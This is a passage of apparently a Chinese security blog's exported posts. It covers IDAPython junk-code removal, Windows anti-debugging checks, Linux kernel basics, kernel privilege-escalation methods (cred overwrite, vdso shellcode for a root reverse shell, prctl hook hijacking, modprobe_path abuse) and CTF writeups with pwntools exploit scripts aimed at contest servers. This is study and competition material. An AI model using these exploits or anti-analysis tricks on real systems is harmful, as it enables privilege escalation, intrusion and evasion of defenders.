= v[0], v1 = v[1], sum = 0, i; uint32_t delta = 0x9e3779b9; uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i &lt; 32; i++) &#123; __asm jmp junk1 __asm __emit 0x12 __asm junk2: __asm ret __asm __emit 0x34 __asm junk1 : __asm call junk2 sum += delta; v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); &#125; v[0] = v0; v[1] = v1;&#125; 这种连续的可执行花指令的去除方法特别简单,直接整块nop掉即可. 但是真正的复杂程序里这种花指令的数量很多,需要使用idapython来编写去除花指令脚本. 123456789101112131415161718192021222324def nop(addr, endaddr): while addr &lt; endaddr: PatchByte(addr, 0x90) addr += 1def undefine(addr, endaddr): while addr &lt; endaddr: MakeUnkn(addr, 0) addr += 1def dejunkcode(addr, endaddr): while addr &lt; endaddr: MakeCode(addr) # 匹配模板 if GetMnem(addr) == 'jmp' and GetOperandValue(addr, 0) == addr + 5 and Byte(addr + 2) == 0x12: next = addr + 10 nop(addr, next) addr = next continue addr += ItemSize(addr)dejunkcode(0x00411820, 0x00411957)undefine(0x00411820, 0x00411957)MakeFunction(0x00411820, -1) 12345678MakeCode(ea) #分析代码区，相当于ida快捷键CItemSize(ea) #获取指令或数据长度GetMnem(ea) #得到addr地址的操作码GetOperandValue(ea,n) #返回指令的操作数的被解析过的值PatchByte(ea, value) #修改程序字节Byte(ea) #将地址解释为ByteMakeUnkn(ea,0) #MakeCode的反过程，相当于ida快捷键UMakeFunction(ea,end) #将有begin到end的指令转换成一个函数。如果end被指定为BADADDR（-1），IDA会尝试通过定位函数的返回指令，来自动确定该函数的结束地址]]></content>
      <categories>
        <category>IS</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-reverse-Windows-反调试]]></title>
    <url>%2Fposts%2Fe7c3b7f1%2F</url>
    <content type="text"><![CDATA[数据检测 通过测试一些与调试相关的关键位置的数据来判断是否处于调试状态. NtGlobalFlag 在32位机器上,NtGlobalFlag字段位于PEB(进程环境块)0x68的偏移处,64位机器则是在偏移0xBC位置. 该字段的默认值为0.包含有一系列的标志位.由调试器创建的进程会设置以下标志位. 123FLG_HEAP_ENABLE_TAIL_CHECK (0x10)FLG_HEAP_ENABLE_FREE_CHECK (0x20)FLG_HEAP_VALIDATE_PARAMETERS (0x40) 使用32位代码检测32位环境. 12345mov eax, fs:[30h] ;Process Environment Blockmov al, [eax+68h] ;NtGlobalFlagand al, 70hcmp al, 70hje being_debugged 使用64位代码检测64位环境. 1234567push 60hpop rsigs:lodsq ;Process Environment Blockmov al, [rsi * 2 + rax - 14h] ;NtGlobalFlagand al, 70hcmp al, 70hje being_debugged 32位程序运行在64位机器会存在两个PEB:一个是32位部分的而另一个是64位.64位的PEB的对应字段也会像在32位的那样而改变. 使用32位代码检测64位环境. 1234567mov eax, fs:[30h] ; Process Environment Block;64-bit Process Environment Block;follows 32-bit Process Environment Blockmov al, [eax+10bch] ;NtGlobalFlagand al, 70hcmp al, 70hje being_debugged NtGlobalFlag的3个标志位只有当程序是由调试器创建而非由调试器附加上去的进程时才会被设置. 有3种方法来绕过NtGlobalFlag的检测. 手动修改标志位的值(Ollydbg用dump fs:[30]+0x68指令dump出NtGlobalFlag的内容,右键选择Binary-&gt;Fill with 00's即可). 在Ollydbg中使用hide-debug插件. 在Windbg禁用调试堆的方式启动程序(windbg -hd program.exe). Heap Flags https://ctf-wiki.github.io/ctf-wiki/reverse/windows/anti-debug/heap-flags-zh/. The Heap https://ctf-wiki.github.io/ctf-wiki/reverse/windows/anti-debug/the-heap-zh/. IsDebuggerPresent kernel32的IsDebuggerPresent()函数只是单纯地返回了BeingDebugged标志的值. 在32位/64位环境中检测. 123call IsDebuggerPresenttest al, aljne being_debugged 使用32位代码检测32位环境. 123mov eax, fs:[30h] ;Process Environment Blockcmp b [eax+2], 0 ;check BeingDebuggedjne being_debugged 使用64位代码检测64位环境. 12345push 60hpop rsigs:lodsq ;Process Environment Blockcmp b [rax+2], 0 ;check BeingDebuggedjne being_debugged 使用32位代码检测64位环境. 12345mov eax, fs:[30h] ;Process Environment Block;64-bit Process Environment Block;follows 32-bit Process Environment Blockcmp b [eax+1002h], 0 ;check BeingDebuggedjne being_debugged 想要克服这些检测,只需要将BeingDebugged标志设为0即可(或改变一下返回值). CheckRemoteDebuggerPresent kernel32的CheckRemoteDebuggerPresent()函数用于检测指定进程是否正在被调试. 1234BOOL WINAPI CheckRemoteDebuggerPresent( _In_ HANDLE hProcess, _Inout_ PBOOL pbDebuggerPresent); 如果调试器存在(通常是检测自己是否正在被调试),该函数会将pbDebuggerPresent指向的值设为0xffffffff. 使用32位代码检测32位环境. 1234567push eaxpush esppush -1 ;GetCurrentProcess()call CheckRemoteDebuggerPresentpop eaxtest eax, eaxjne being_debugged 使用64位代码检测64位环境. 1234567enter 20h, 0mov edx, ebpor rcx, -1 ;GetCurrentProcess()call CheckRemoteDebuggerPresentleavetest ebp, ebpjne being_debugged NtQueryInformationProcess CheckRemoteDebuggerPresent内部其实是通过调用NtQueryInformationProcess来完成功能的. 1234567NTSTATUS WINAPI NtQueryInformationProcess( _In_ HANDLE ProcessHandle, _In_ PROCESSINFOCLASS ProcessInformationClass, _Out_ PVOID ProcessInformation, _In_ ULONG ProcessInformationLength, _Out_opt_ PULONG ReturnLength); NtQueryInformationProcess()函数接受一个信息类的参数用于查询,当给定值为0(ProcessBasicInformation)或7(ProcessDebugPort)时能得到相关调试信息,返回信息会写到第三个参数ProcessInformation指向的缓冲区中. NtQueryInformationProcess内部是通过查询EPROCESS结构体的DebugPort字段,当进程正在被调试时,返回值为0xffffffff. 使用32位代码检测32位环境. 1234567891011push eaxmov eax, esppush 0push 4 ;ProcessInformationLengthpush eaxpush 7 ;ProcessDebugPortpush -1 ;GetCurrentProcess()call NtQueryInformationProcesspop eaxinc eaxje being_debugged 使用64位代码检测64位环境. 12345678910111213xor ebp, ebpenter 20h, 0push 8 ;ProcessInformationLengthpop r9push rbppop r8push 7 ;ProcessDebugPortpop rdxor rcx, -1 ;GetCurrentProcess()call NtQueryInformationProcessleavetest ebp, ebpjne being_debugged 由于信息传自内核,所以在用户模式下的代码没有轻松的方法阻止该函数检测调试器. Windows XP引入了debug对象,当一个调试会话启动,会同时创建一个debug对象以及与之关联的句柄.可以使用ProcessDebugObjectHandle = 0x1e类来查询这个句柄的值. 使用32位代码检测32位环境. 1234567891011push 0mov eax, esppush 0push 4 ;ProcessInformationLengthpush eaxpush 1eh ;ProcessDebugObjectHandlepush -1 ;GetCurrentProcess()call NtQueryInformationProcesspop eaxtest eax, eaxjne being_debugged 使用64位代码检测64位环境. 12345678910111213xor ebp, ebpenter 20h, 0push 8 ;ProcessInformationLengthpop r9push rbppop r8push 1eh ;ProcessDebugObjectHandlepop rdxor rcx, -1 ;GetCurrentProcess()call NtQueryInformationProcessleavetest ebp, ebpjne being_debugged ProcessDebugFlags = 0x1f类返回EPROCESS结构体的NoDebugInherit的相反数.即调试器存在时返回0,不存在时则返回1. 使用32位代码检测32位环境. 1234567891011push eaxmov eax, esppush 0push 4 ;ProcessInformationLengthpush eaxpush 1fh ;ProcessDebugFlagspush -1 ;GetCurrentProcess()call NtQueryInformationProcesspop eaxtest eax, eaxje being_debugged 使用64位代码检测64位环境. 12345678910111213xor ebp, ebpenter 20h, 0push 4 ;ProcessInformationLengthpop r9push rbppop r8push 1fh ;ProcessDebugFlagspop rdxor rcx, -1 ;GetCurrentProcess()call NtQueryInformationProcessleavetest ebp, ebpje being_debugged ZwSetInformationThread ZwSetInformationThread等同于NtSetInformationThread,通过为线程设置ThreadHideFromDebugger,可以禁止线程产生调试事件. 12345678910111213#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;typedef DWORD(WINAPI* ZW_SET_INFORMATION_THREAD) (HANDLE, DWORD, PVOID, ULONG);#define ThreadHideFromDebugger 0x11VOID DisableDebugEvent(VOID)&#123; HINSTANCE hModule; ZW_SET_INFORMATION_THREAD ZwSetInformationThread; hModule = GetModuleHandleA("Ntdll"); ZwSetInformationThread = (ZW_SET_INFORMATION_THREAD)GetProcAddress(hModule, "ZwSetInformationThread"); ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, 0, 0);&#125; 如果处于调试状态,执行完ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, 0, 0);程序就会退出. 调试执行到该函数时,若发现第2个参数值为0x11,跳过或者将0x11修改为其他值即可. 符号检测 符号检测主要针对一些使用了驱动的调试器或监视器,这类调试器在启动后会创建相应的驱动链接符号,以用于应用层与其驱动的通信. 窗口检测 通过检测当前桌面中是否存在特定的调试窗口来判断是否存在调试器,不能判断该调试器是否正在调试该程序. 特征码检测 特征码检测枚举当前正在运行的进程,并在进程的内存空间中搜索特定调试器的代码片段. 例如:OllyDbg有这样一段特征码. 10x41, 0x00, 0x62, 0x00, 0x6f, 0x00, 0x75, 0x00, 0x74, 0x00, 0x20, 0x00, 0x4f, 0x00, 0x6c, 0x00, 0x6c, 0x00, 0x79, 0x00, 0x44, 0x00, 0x62, 0x00, 0x67, 0x00, 0x00, 0x00, 0x4f, 0x00, 0x4b, 0x00, 0x00, 0x00 123456789101112131415161718192021222324BOOL CheckDebug() &#123; BYTE sign[] = &#123;0x41, 0x00, 0x62, 0x00, 0x6f, 0x00, 0x75, 0x00, 0x74, 0x00, 0x20, 0x00, 0x4f, 0x00, 0x6c, 0x00, 0x6c, 0x00, 0x79, 0x00, 0x44, 0x00, 0x62, 0x00, 0x67, 0x00, 0x00, 0x00, 0x4f, 0x00, 0x4b, 0x00, 0x00, 0x00;&#125; PROCESSENTRY32 sentry32 = &#123;0&#125;; sentry32.dwSize = sizeof(sentry32); HANDLE phsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); Process32First(phsnap, &amp;sentry32); do &#123; HANDLE hps = OpenProcess(MAXIMUM_ALLOWED, FALSE, sentry32.th32ProcessID); if (hps != 0) &#123; DWORD szReaded = 0; BYTE signRemote[sizeof(sign)]; ReadProcessMemory(hps, (LPCVOID)0x4f632a, signRemote, sizeof(signRemote), &amp;szReaded); if (szReaded &gt; 0) &#123; if (memcmp(sign, signRemote, sizeof(sign)) == 0) &#123; CloseHandle(phsnap); return 0; &#125; &#125; &#125; &#125; sentry32.dwSize = sizeof(sentry32);&#125; while(Process32Next(phsnap, &amp;sentry32)); 行为检测 行为检测是指在程序中通过代码感知程序处于调试时与未处于调试时的各种差异来判断程序是否处于调试状态. 例如在调试时步过两条指令所花费的时间远远超过CPU正常执行花费的时间,可以通过rdtsc指令来进行测试(该指令用于将时间标签计数器读入EDX:EAX寄存器). 1234567891011121314BOOL CheckDebug() &#123; int BeingDbg = 0; __asm &#123; rdtsc mov ecx, edx rdtsc sub edx, ecx mov BeingDbg, edx &#125; if (BeingDbg &gt; 2) &#123; return 0; &#125; return 1;&#125; 断点检测 调试器一般使用两种方法设置代码断点:通过修改代码指令为INT3,机器码为0xCC触发软件异常;通过硬件调试寄存器设置硬件断点; 针对软件断点,检测系统会扫描比较重要的代码区域,看是否存在多余的INT3指令. 1234567891011121314151617181920212223BOOL CheckDebug() &#123; PIMAGE_DOS_HEADER pDosHeader; PIMAGE_NT_HEADERS32 pNtHeaders; PIMAGE_SECTION_HEADER pSectionHeader; DWORD dwBaseImage = (DWORD)GetModuleHandle(NULL); pDosHeader = (PIMAGE_DOS_HEADER)dwBaseImage; pNtHeaders = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew); pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + sizeof(pNtHeaders-&gt;Signature) + sizeof(IMAGE_FILE_HEADER) + (WORD)pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader); DWORD dwAddr = pSectionHeader-&gt;VirtualAddress + dwBaseImage; DWORD dwCodeSize = pSectionHeader-&gt;SizeOfRawData; BOOL Found = FALSE; __asm &#123; cld mov edi,dwAddr mov ecx,dwCodeSize mov al,0CCH repne scasb ; 在EDI指向大小为ECX的缓冲区中搜索AL包含的字节 jnz NotFound mov Found,1 NotFound: &#125; return Found;&#125; 由于程序工作在保护模式下,无法访问硬件调试断点,所以一般需要构建异常程序来获取DR寄存器的值. 12345678910BOOL CheckDebug() &#123; CONTEXT context; HANDLE hThread = GetCurrentThread(); context.ContextFlags = CONTEXT_DEBUG_REGISTERS; GetThreadContext(hThread, &amp;context); if (context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3 != 0) &#123; return 1; &#125; return 0; &#125; 行为占用 行为占用是指在需要保护的程序中,程序自身将一些只能同时有1个实例的功能占为己用. 比如一般情况下,一个进程只能同时被1 个调试器调试,那么就可以将程序以调试方式启动,然后利用系统的调试机制防止被其他调试器调试. 陷阱标志 单步执行:也是异常与SHE结合. 置位陷阱标志后,执行下一条指令将会触发单步异常,对应的SEH处理程序值只是单纯的改变了EIP的值,然后返回,到新的EIP值处执行,若调试器未忽略该异常,将会NOP处继续执行到非法地址. INT 2D:一种调试时不会触发,正常运行才会触发的断点,正常运行到int 2d处将会触发异常执行SHE,调试时,单步执行会直接直接运行到程序终止. 破解方法就是手动触发异常(需要注意,这里的异常处理程序是通过更改EBP - 4即本地变量来判断是否处于调试状态,若是更改EIP则需要在正确的地址处触发异常).]]></content>
      <categories>
        <category>IS</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-NOTES-Linux内核设计与实现-简介]]></title>
    <url>%2Fposts%2Fb0a0a409%2F</url>
    <content type="text"><![CDATA[Linux内核简介 内核是操作系统的核心,包括:响应中断,执行中断服务程序;管理多个进程,调度和分享处理器的时间;管理进程地址空间的内存管理;网络和进程间通信等系统服务程序. 内核的活动范围:运行于用户空间,执行用户进程;运行于内核空间,处于进程上下文,代表某个特定进程的执行;运行于内核空间,处于中断上下文,与任何进程无关,处理某个特定的中断. 操作系统内核可以分为单内核和微内核(还有外内核,主要用在科研系统中). 1980年之前,所有的内核都设计成单内核. 单内核就是把内核从整体上作为一个单独的大过程来实现,同时也运行在一个单独的地址空间上.这样的内核通常以单个静态二进制文件的形式(vmlinux)存放于磁盘中,所有内核服务都在一个内核地址空间上运行. 内核之间的通信是微不足道的,并且内核可以直接调用函数.单内核的支持者认为单模块具有简单和性能高的特点,大多数Unix系统都设计为单模块. 微内核的功能被划分为多个独立的过程,每个过程叫做一个服务器.理想情况下,只有强烈请求特权服务的服务器才运行在特权模式下,其他服务器都运行在用户空间. 不过,所有的服务器都保持独立并运行在各自的地址空间上.因此微内核不能像单模块内核那样直接调用函数,而是通过消息传递处理微内核通信,各个服务器之间通过IPC机制互通消息,互换服务.服务器的各自独立有效地避免了一个服务器的失效祸及另一个,同样,模块化的系统允许一个服务器为了另一个服务器而换出. IPC机制的开销多于函数调用,又会涉及内核空间与用户空间的上下文切换,所以消息传递需要一定的周期,而单内核中简单的函数调用没有这些开销. 所有实际应用的基于微内核的系统都让大部分或全部服务器位于内核,这样,就可以直接调用函数,消除频繁的上下文切换.Windows NT内核(Windows XP,Windows Vista和Windows 7等基于此)和Mach(Mac OS X的组成部分)是微内核的典型实例. 不管是Windows NT还是Mac OS X,都在其新近版本中不让任何微内核服务器运行在用户空间,这违背了微内核设计的初衷. Linux是一个单内核,同时Linux汲取了微内核的精华:模块化设计,抢占式内核,支持内核线程以及动态装载内核模块的能力. 不仅如此,Linux还避其微内核设计上性能损失的缺陷,让所有事情都运行在内核态,直接调用函数,无须消息传递.至今,Linux是模块化的,多线程的以及内核本身可调度的操作系统. Linux内核与传统的Unix系统之间存在一些显著的差异. Linux支持动态加载内核模块. Linux支持对称多处理(SMP)机制,尽管许多Unix的变体也支持SMP,但传统的Unix并不支持这种机制. Linux内核可以抢占(preemptive),即允许在内核运行的任务优先执行,在其他各种Unix产品中,只有Solaris和IRIX支持抢占. Linux内核并不区分线程和其他的一般进程,对于内核来说,所有的进程都一样,只不过是其中的一些共享资源而已. Linux提供具有设备类的面向对象的设备模型,热插拔事件,以及用户空间的设备文件系统(sysfs). Linux忽略了一些被认为是设计得很拙劣的Unix特性,像STREAMS,它还忽略了那些难以实现的过时标准. 由于所有的Unix内核都同宗同源,并且提供相同的API,现代的Unix内核存在许多设计上的相似之处. Unix内核几乎毫无例外的都是一个不可分割的静态可执行库,它们必须以巨大,单独的可执行块的形式在一个单独的地址空间中运行. Unix内核通常需要硬件系统提供页机制(MMU)以管理内存.初期的Linux系统也需要MMU支持,但有一些特殊版本并不依赖于此.这无疑是一个简洁的设计,因为它可以使Linux系统运行在没有MMU的小型嵌入系统上.不过现实之中,即便很简单的嵌入系统都开始具备内存管理单元这种高级功能了. Linux内核版本号 Linux的版本号分为内核版本与发行版本.内核版本号由3个或4个数字组成,中间由.分隔. 3个数字:A.B.C. 123A:内核主版本号,只有当发生重大变化的代码和内核发生才会变化.B:内核次版本号,是指一些重大修改的内核.偶数表示稳定版本,奇数表示开发中版本.C:内核修订版本号,是指轻微修订的内核.这个数字当有安全补丁,bug修复,新的功能或驱动程序等便会有变化. 4个数字:major.minor.patch-build.desc. 1234567891011major:主版本号,有结构变化才变更.minor:次版本号,新增功能时才发生变化,偶数表示稳定版本,奇数表示开发中版本.patch:补丁包数或次版本的修改次数.build:编译(或构建)的次数,每次编译可能对少量程序做优化或修改,但一般没有大的功能变化.desc:当前版本的特殊信息,其信息由编译时指定,具有较大的随意性,有如下的标识是常用的: rc(r),表示发行候选版本(release candidate),rc后的数字表示该正式版本的第几个候选版本,多数情况下,各候选版本之间数字越大越接近正式版. smp,表示对称多处理器(Symmetric MultiProcessing). pp,在Red Hat Linux中常用来表示测试版本(pre-patch). EL,在Red Hat Linux中用来表示企业版Linux(Enterprise Linux). mm,表示专门用来测试新的技术或新功能的版本. fc,在Red Hat Linux中表示Fedora Core.]]></content>
      <categories>
        <category>CS</category>
        <category>NOTES</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-kernel-任意读写到权限提升]]></title>
    <url>%2Fposts%2F1b3982a0%2F</url>
    <content type="text"><![CDATA[cred结构体提权 每个线程在内核中都对应一个线程栈,一个线程结构体thread_info,结构体同时也包含了线程的一系列信息,thread_info结构体存放在线程栈的最低地址. 12345678struct thread_info &#123; unsigned long flags; /* low level flags */ int preempt_count; /* 0 =&gt; preemptable, &lt;0 =&gt; BUG */ struct task_struct *task; /* main task structure */ mm_segment_t addr_limit; /* thread address space */ __u32 cpu; /* current CPU */ unsigned long thr_ptr; /* TLS ptr */&#125;; thread_info中最重要的信息是task_struct结构体,task_struct结构体有一个成员就是该线程对应的cred结构体,标注该线程权限. 12345678910111213struct task_struct &#123; volatile long state; void *stack; atomic_t usage; unsigned int flags; unsigned int ptrace; //... const struct cred __rcu *ptracer_cred; const struct cred __rcu *real_cred; const struct cred __rcu *cred; char comm[TASK_COMM_LEN]; //...&#125;; 12345678910111213141516171819struct cred &#123; atomic_t usage;#ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; void *put_addr; unsigned magic;#define CRED_MAGIC 0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif kuid_t uid; kgid_t gid; kuid_t suid; kgid_t sgid; kuid_t euid; kgid_t egid; kuid_t fsuid; kgid_t fsgid; //...&#125;; cred结构体在线程初始化由prepare_creds函数创建,创建cred结构体的方法是kmem_cache_alloc.可以通过修改cred结构体中的uid ~ fsgid(前28字节)为0获取root权限.也可以执行commit_creds(prepare_kernel_cred(0))获得root权限. cred结构体在线程初始化由prepare_creds函数创建,在新版本内核中cred采用了cred_jar这个新的kmem_cache,与kmalloc使用的kmalloc-xx是隔离的. 可以通过prctl函数中的PR_SET_NAME功能设置task_struct里的char comm[TASK_COMM_LEN]成员为一个特殊值,再利用内存任意读找到task_structure结构体,从而找到cred结构体. 由于task_structure是kmem_cache_alloc_node,因此task_struct应该存在内核的动态分配区域,爆破范围应该在0xffff880000000000 ~ 0xffffc80000000000. 例子:https://github.com/mncoppola/StringIPC/blob/master/solution/solution.c. vdso重写 vdso在用户空间映射为R/X,而在内核空间为R/W,所以可以在内核空间修改它,接着在用户空间执行. 由于vdso同时映射在内核空间以及每一个进程的虚拟内存中,包括那些以root权限运行的进程,利用内存读找到内存中vdso的逻辑页,由于内核态有写入的权限,因此利用任意写写入shellcode覆盖其中某些函数然后等待某root进程或者有s权限的进程调用这个函数就可以利用反弹shell完成提权. 定位vdso可以读取/proc/kallsyms,通过vdso_pages直接获取这些地址. 还可以在0xffffffff80000000 ~ 0xffffffffffffefff中搜寻每一个页的开头,看是否有ELF头或者部分vdso的映射,还可以通过vdso的标志进一步缩小这些页的范围.下面是实现这个思路的代码. 1234567891011121314void * header = 0;void * loc = 0xffffffff80000000;size_t i = 0;for (;loc &lt; 0xffffffffffffafff;loc += 0x1000) &#123; readMem(&amp;header, loc, 8); if (header == 0x010102464c457f) &#123; fprintf(stderr, "%p elf\n", loc); readMem(&amp;header, loc + 0x270, 8); if (header == 0x65675f6b636f6c63) &#123; fprintf(stderr, "%p found it?\n", loc); break; &#125; &#125;&#125; 在高版本的glibc中,可以通过以下代码获得vdso的地址. 1234567891011121314#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/auxv.h&gt; #include &lt;sys/mman.h&gt;int main()&#123; unsigned long sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR); if (sysinfo_ehdr!=0)&#123; for (int i=0;i&lt;0x2000;i+=1)&#123; printf("%02x ",*(unsigned char *)(sysinfo_ehdr+i)); &#125; &#125;&#125; 找到了vdso所在的区域后就能用shellcode来覆盖.该shellcode只为root进程创建反弹shell,因为每一个调用gettimeofday的进程都会触发shellcode,可以通过调用sys_getuid系统调用并将结果与0进行比较来找到root权限进程. 没有root权限则继续调用sys_gettimeofday系统调用.在root进程当中通过0x39系统调用fork一个子进程,父进程继续执行sys_gettimeofday,而由子进程来执行反弹shell(或者提权). 参考:https://gist.github.com/itsZN/1ab36391d1849f15b785.这个shellcode利用的是crontab进程会执行gettimeofday从而提权. vdso/vsyyscall overwriting是一个非常有用的技术,它能够用在对于中断上下文(interrupt context)的利用,因为它不需要本地进程来映射一段内存,或者提升权限.但是新的内核可以通过设置编译参数使vdso内核态不可写. HijackPrctl HijackPrctl的原理在dong-hoon you(x86)分享的《New Reliable Android Kernel Root Exploitation Techniques》中提到,被用于安卓root,可以绕过PXN防御. 12//include/linux/security.hextern int cap_task_prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5); 在kernel/sys.c中,可以发现prctl系统调用将参数原封不动的传给了security_task_prctl函数进行处理. 1234567SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3, unsigned long, arg4, unsigned long, arg5) &#123; struct task_struct *me = current; unsigned char comm[sizeof(me-&gt;comm)]; long error; error = security_task_prctl(option, arg2, arg3, arg4, arg5); /* code */&#125; 而security_task_prctl函数最后调用了虚表函数. 1234567891011121314int security_task_prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) &#123; int thisrc; int rc = -ENOSYS; struct security_hook_list *hp; hlist_for_each_entry(hp, &amp;security_hook_heads.task_prctl, list) &#123; thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5); if (thisrc != -ENOSYS) &#123; rc = thisrc; if (thisrc != 0) break; &#125; &#125; return rc;&#125; 调试发现这个hook位于capability + 0x520 + 0x18这个偏移,可以通过修改这个指针,从而劫持控制流.但是prctl系统调用第一个参数是int类型的,导致64位系统第一个参数如果是64位的话会被截断. 这不影响32位下的漏洞利用,先通过劫持hook为set_memory_rw,然后传入vdso的地址,将vdso修改为可写,之后的就可以劫持vdso. 64位下是不可行的,因为第一个参数被截断了. call_usermoderhelper是内核运行用户程序的一个api,有root权限.通过它就能以root权限执行想要执行的程序. call_usermoderhelper的第一个参数也是64位的,不能直接劫持.但是内核中有些代码片段是调用call_usermoderhelper的. 比如kernel/reboot.c中的orderly_poweroff函数中调用run_cmd(poweroff_cmd),poweroff_cmd是一个全局变量,可以修改,第一个参数必须是程序的绝对路径. 通过任意地址读泄露出vdso地址,vdso在vmlinux代码中,可以通过ida的可见字符串的__vdso_gettimeofday找到其偏移,得到内核基址. 如果开启了selinux_disable则需要篡改prctl的hook为selinux_disable函数的地址.调用prctl使得selinux失效.这一步是安卓root必须的一步. 篡改poweroff_cmd为目的命令,篡改prctl的hook为orderly_poweroff,调用prctl执行预期命令内核提权. modprobe_path 当内核运行一个错误格式的文件的时候,会调用这个modprobe_path所指向的二进制文件.可以通过劫持这个指针来运行恶意文件. 12cat /proc/kallsyms | grep modprobe_path#root 创建目标可执行文件. 1234system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' &gt; /home/pwn/copy.sh");system("chmod +x /home/pwn/copy.sh");system("echo -ne '\\xff\\xff\\xff\\xff' &gt; /home/pwn/w4rd3n");system("chmod +x /home/pwn/w4rd3n"); 劫持modprobe_path到可执行文件/home/pwn/copy.sh后就可以触发并获取flag. 12system("/home/pwn/w4rd3n");system("cat /home/pwn/flag");]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux-kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-天翼杯-2020]]></title>
    <url>%2Fposts%2F5940d912%2F</url>
    <content type="text"><![CDATA[SafeBox shellcode构造,or爆破. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *context.aslr = Falsecontext.arch = "amd64"context.os = "linux"# context.log_level = "debug"r = process("./chall")# r = process("./chall.bak")# r = remote("183.129.189.61","60302")# gdb.attach(r, "b * 0x555555554000 + 0xd80\nc")r.recvuntil("safe-execution box?\n")flag = "DASCTF&#123;e56d4c055a31f4a4b16e6f4d9feae7d8&#125;"idx = 39while(1): for i in range(0x20, 0x7f, 1): r = remote("183.129.189.61", "60302") r.recvuntil("safe-execution box?\n") shellcode = ''' mov rdi, 0x10032 + 0x1010101 sub rdi, 0x1010101 push rdx push rdx pop rax pop rsi add rax, 2 syscall sub rax, 1 syscall push rdi pop rsi push rax pop rdi push rdx pop rax push rsi pop rdx syscall mov dl, [rsi + &#123;&#125;] cmp dl, &#123;&#125; jz $ '''.format(idx, i) payload = asm(shellcode) payload = payload.ljust(0x32, "A") # payload += "/home/w4rd3n/f" payload += "/home/pwn/flag" r.send(payload) try: r.recv(timeout = 3) except Exception as e: r.close() continue flag += chr(i) print(flag) idx = idx + 1 break EasyRSA 明文空间太小,可以穷举. 123456789101112# n = ...# c = ...# for e in range(20000):# if pow(ord('a'), e, n) in c:# breake = 11299table = []for i in range(256): table.append(pow(i, e, n))print(''.join(chr(table.index(i)) for i in c))]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-wmctf-2020]]></title>
    <url>%2Fposts%2Ffcce4353%2F</url>
    <content type="text"><![CDATA[pwn mengyedekending dnspy逆向babycat.dll.\r覆写num为0触发后门即可. 12345678from pwn import *io = remote("111.73.46.229", 51000)io.sendlineafter("repeat?\r\n", "\r" * 108+ "\x00")io.sendlineafter("input?\r\n", "a")io.sendlineafter("!\r\n", str(0))io.interactive() cfgo-CheckIn dfs过100关,发现一个栈溢出,通过覆盖println函数栈上的参数泄露pie地址,部分覆盖返回地址跳回backdoor(这里要爆破1/16). 然后泄露链式栈地址用于定位/bin/sh参数,最后ROP获得shell. dfs代码. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#include&lt;string.h&gt;#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int dfs(char a[1000][1000], char * answer, int x, int y) &#123; if(x &gt; 0 &amp;&amp; a[x - 1][y] == 5) &#123; answer[strlen(answer)] = 'w'; return 1; &#125; if(x &lt; 999 &amp;&amp; a[x + 1][y] == 5) &#123; answer[strlen(answer)] = 's'; return 1; &#125; if(y &gt; 0 &amp;&amp; a[x][y - 1] == 5) &#123; answer[strlen(answer)] = 'a'; return 1; &#125; if(y &lt; 999 &amp;&amp; a[x][y + 1] == 5) &#123; answer[strlen(answer)] = 'd'; return 1; &#125; if(x &gt; 0 &amp;&amp; a[x - 1][y] == 1) &#123; a[x - 1][y] = 3; a[x][y] = 2; answer[strlen(answer)] = 'w'; if(dfs(a, answer, x - 1, y)) return 1; answer[strlen(answer) - 1] = 0; &#125; if(x &lt; 999 &amp;&amp; a[x + 1][y] == 1) &#123; a[x + 1][y] = 3; a[x][y] = 2; answer[strlen(answer)] = 's'; if(dfs(a, answer, x + 1, y)) return 1; answer[strlen(answer) - 1] = 0; &#125; if(y &gt; 0 &amp;&amp; a[x][y - 1] == 1) &#123; a[x][y - 1] = 3; a[x][y] = 2; answer[strlen(answer)] = 'a'; if(dfs(a, answer, x, y - 1)) return 1; answer[strlen(answer) - 1] = 0; &#125; if(y &lt; 999 &amp;&amp; a[x][y + 1] == 1) &#123; a[x][y + 1] = 3; a[x][y] = 2; answer[strlen(answer)] = 'd'; if(dfs(a, answer, x, y + 1)) return 1; answer[strlen(answer) - 1] = 0; &#125; return 0 ;&#125;void find(char a[1000][1000], char * 